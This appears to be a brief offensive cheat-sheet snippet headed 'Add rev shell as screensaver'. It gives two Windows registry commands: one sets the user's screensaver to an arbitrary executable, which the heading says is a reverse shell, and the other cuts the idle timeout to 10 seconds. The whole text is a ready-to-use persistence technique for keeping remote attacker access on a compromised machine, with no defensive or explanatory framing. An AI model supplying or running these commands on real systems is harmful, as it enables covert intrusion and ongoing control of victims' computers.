### Add rev shell as screensaver
```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "c:\<exeFile>" /f
```

### Set idle delay to 10 seconds
```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "10" /f
```

